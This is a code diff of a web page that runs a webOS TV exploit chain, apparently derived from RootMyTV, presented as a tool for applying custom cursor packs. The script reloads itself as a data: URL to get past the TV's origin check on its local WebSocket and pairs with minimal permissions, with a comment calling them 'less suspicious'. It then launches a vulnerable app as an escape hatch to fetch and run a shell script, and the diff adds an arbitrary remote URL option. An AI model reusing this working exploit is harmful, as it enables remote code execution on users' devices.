@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Custom Cursors</title>
+    <title>Return the Beanbird Cursor</title>
     <style>
         body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
         .button { padding: 20px 40px; margin: 10px; font-size: 1.2rem; border-radius: 50px; border: none; cursor: pointer; color: white; font-weight: bold; transition: 0.2s; }
@@ -11,40 +11,97 @@
         .button:focus { outline: 4px solid #fff; transform: scale(1.05); }
         #log { background: #000; color: #00ff00; width: 80%; height: 150px; margin: 20px auto; padding: 10px; text-align: left; font-family: monospace; border: 1px solid #333; overflow-y: auto; }
         .note { border: 1px solid #ffcc00; color: #ffcc00; padding: 10px; display: inline-block; margin: 10px; border-radius: 5px; }
+
+        /* Cursor picker */
+        #cursor-picker { margin: 20px auto; max-width: 700px; }
+        #cursor-picker h2 { font-size: 1.1rem; margin-bottom: 10px; color: #ccc; }
+        .cursor-grid { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin-bottom: 15px; }
+        .cursor-option {
+            background: #2a2a2a; border: 2px solid #444; border-radius: 10px;
+            padding: 12px 18px; cursor: pointer; font-size: 0.95rem; color: #ddd;
+            transition: 0.15s; min-width: 120px;
+        }
+        .cursor-option:hover { border-color: #ff9900; color: #fff; }
+        .cursor-option.selected { border-color: #ff0066; background: #3a1a2a; color: #fff; }
+        .cursor-option .label { font-weight: bold; display: block; }
+        .cursor-option .sublabel { font-size: 0.75rem; color: #888; display: block; margin-top: 3px; }
+        .cursor-option.selected .sublabel { color: #ffaaaa; }
+
+        #custom-url-row { display: none; margin: 10px auto; max-width: 600px; }
+        #custom-url-row input {
+            width: 75%; padding: 10px 14px; font-size: 0.95rem; border-radius: 8px;
+            border: 2px solid #555; background: #111; color: #fff; outline: none;
+        }
+        #custom-url-row input:focus { border-color: #ff9900; }
+        #custom-url-row input::placeholder { color: #555; }
     </style>
 </head>
 <body>
     <h1>Return the Beanbird Cursor</h1>
     <p>Press the button below and <b>Accept the prompt on your TV screen.</b></p>
-    
-    <button id="btn-run" class="button">7.5</button>
+
+    <div id="cursor-picker">
+        <h2>Select a cursor pack:</h2>
+        <div class="cursor-grid">
+            <div class="cursor-option selected" data-url="https://github.com/itsRealM12C/convert/raw/refs/heads/main/4.0.zip">
+                <span class="label">Beanbird 4.0</span>
+                <span class="sublabel">Default / original</span>
+            </div>
+            <div class="cursor-option" data-url="https://github.com/itsRealM12C/convert/raw/refs/heads/main/7.5.zip">
+                <span class="label">Beanbird 7.5</span>
+                <span class="sublabel">Newer pack</span>
+            </div>
+            <div class="cursor-option" data-url="custom">
+                <span class="label">Custom URL</span>
+                <span class="sublabel">Enter your own .zip</span>
+            </div>
+        </div>
+        <div id="custom-url-row">
+            <input type="text" id="custom-url-input" placeholder="https://example.com/cursor.zip" autocomplete="off" spellcheck="false" />
+        </div>
+    </div>
+
+    <button id="btn-run" class="button">Apply Selected Cursor</button>
     <button id="btn-reset" class="button">Reset to Default</button>
     <br>
     <div class="note">Note: TV will be blackscreen for 10-20 seconds during the process.</div>
-    
+
     <div id="log">Status: Ready.</div>
 
     <script>
-        // --- Capture the full base URL (including subdirectory path) before data: navigation ---
-        // window.location.origin alone gives https://itsrealm12c.github.io — missing /rbc/.
-        // We need the full folder path so stage2.html and script URLs resolve correctly.
+        var selectedUrl = document.querySelector('.cursor-option.selected').dataset.url;
+
+        document.querySelectorAll('.cursor-option').forEach(function(opt) {
+            opt.addEventListener('click', function() {
+                document.querySelectorAll('.cursor-option').forEach(function(o) { o.classList.remove('selected'); });
+                opt.classList.add('selected');
+                selectedUrl = opt.dataset.url;
+                document.getElementById('custom-url-row').style.display =
+                    (selectedUrl === 'custom') ? 'block' : 'none';
+            });
+        });
+
+        function getActiveUrl() {
+            if (selectedUrl === 'custom') {
+                var v = document.getElementById('custom-url-input').value.trim();
+                return v || null;
+            }
+            return selectedUrl;
+        }
+    </script>
+
+    <script>
         window.ORIGIN_URL =
             window.location.protocol === 'data:' ? '__ORIGIN__' :
             window.location.protocol === 'file:' ? 'http://127.0.0.1' :
-            window.location.href.replace(/\/[^\/]*$/, ''); // strips filename, keeps folder path
+            window.location.href.replace(/\/[^\/]*$/, '');
 
-        // --- Navigate self to data: URL so WebSocket sends Origin: null ---
-        // SSAP on webOS 4.x blocks http/https origins but allows null (data: origin).
-        // btoa() crashes on non-Latin1 chars on older webOS Chromium — use the
-        // unescape+encodeURIComponent trick to safely encode any unicode in the page HTML.
         try {
             if (window.location.protocol !== 'data:') {
                 var html = document.documentElement.innerHTML
                     .replace('__ORIGIN__', window.ORIGIN_URL);
-                // Safe btoa for unicode: percent-encode then collapse back to bytes
                 var b64 = btoa(unescape(encodeURIComponent(html)));
                 window.location = 'data:text/html;base64,' + b64;
-                // Execution stops here — page reloads as data: URL
             }
         } catch(e) {}
     </script>
@@ -52,10 +109,6 @@
         var logBox = document.querySelector('#log');
         function log(str) { logBox.innerText += '> ' + str + '\n'; logBox.scrollTop = logBox.scrollHeight; }
 
-        // --- ProxyWebSocket ---
-        // Opens the real WebSocket inside a data: iframe so Origin: null is sent.
-        // Direct new WebSocket() from an http: page sends Origin: http://... which
-        // SSAP on webOS 4.x rejects silently — that was the core bug.
         function ProxyWebSocket(target) {
             function proxyPayload(address) {
                 function forward(type, data) {
@@ -100,18 +153,14 @@
             if (this.proxy.parentNode) this.proxy.parentNode.removeChild(this.proxy);
         };
 
-        // --- Main exploit ---
         var activeConn = null;
 
-        function startExploit(scriptName) {
+        function startExploit(scriptName, cursorZipUrl) {
             if (activeConn) { try { activeConn.close(); } catch(e) {} }
 
-            // Build stage2 URL using the captured HTTP origin (ORIGIN_URL),
-            // because window.location is now data: and has no useful origin.
-            // Pass script name as hash fragment, NOT ?run= query param.
-            // facebooklogin rewrites/drops query strings when loading the server URL,
-            // but # fragment is never sent to the server so it survives intact.
-            var stage2Url = window.ORIGIN_URL + '/stage2.html#' + encodeURIComponent(scriptName);
+            var hashVal = encodeURIComponent(scriptName);
+            if (cursorZipUrl) hashVal += '|' + encodeURIComponent(cursorZipUrl);
+            var stage2Url = window.ORIGIN_URL + '/stage2.html#' + hashVal;
 
             log('Connecting via proxy iframe (Origin: null)...');
             var conn = new ProxyWebSocket('ws://127.0.0.1:3000');
@@ -132,15 +181,13 @@
                         pairingType: 'PROMPT',
                         manifest: {
                             manifestVersion: 1,
-                            localizedAppNames: { '': 'Custom Cursor' },
-                            // Minimal set — less suspicious, still enough to listApps + launch
+                            localizedAppNames: { '': 'Beanbird Cursor' },
                             permissions: ['LAUNCH', 'READ_INSTALLED_APPS']
                         }
                     }
                 }));
             };
 
-            // Pending request callbacks keyed by message id
             var pending = {};
             function request(uri, payload, cb) {
                 var id = 'req_' + Date.now();
@@ -154,9 +201,6 @@
 
                 if (msg.type === 'registered') {
                     log('Registered! Scanning for escape app...');
-
-                    // Query installed apps and pick best available escape hatch —
-                    // same priority logic as RootMyTV so we work even if facebooklogin is absent.
                     request('ssap://com.webos.applicationManager/listApps', {}, function(res) {
                         var candidates = {
                             'com.webos.app.facebooklogin': {
@@ -198,26 +242,24 @@
                     });
 
                 } else if (msg.type === 'response') {
-                    if (pending[msg.id]) {
-                        pending[msg.id](msg);
-                        delete pending[msg.id];
-                    }
-                    // else: intermediate register response — just wait
-
+                    if (pending[msg.id]) { pending[msg.id](msg); delete pending[msg.id]; }
                 } else if (msg.type === 'error') {
                     log('Error (prompt declined?): ' + evt.data);
-                    if (pending[msg.id]) {
-                        pending[msg.id](msg);
-                        delete pending[msg.id];
-                    }
+                    if (pending[msg.id]) { pending[msg.id](msg); delete pending[msg.id]; }
                 }
             };
         }
 
-        // Use .txt extension so any HTTP server serves the file without MIME blocking.
-        // Stage2 saves it locally as .sh before executing.
-        document.querySelector('#btn-run').onclick    = function() { startExploit('beanbird.txt'); };
-        document.querySelector('#btn-reset').onclick  = function() { startExploit('reboot.txt'); };
+        document.querySelector('#btn-run').onclick = function() {
+            var url = getActiveUrl();
+            if (!url) { log('ERROR: Please enter a custom cursor URL.'); return; }
+            log('Using cursor pack: ' + url);
+            startExploit('beanbird.txt', url);
+        };
+
+        document.querySelector('#btn-reset').onclick = function() {
+            startExploit('reboot.txt', null);
+        };
     </script>
 </body>
 </html>
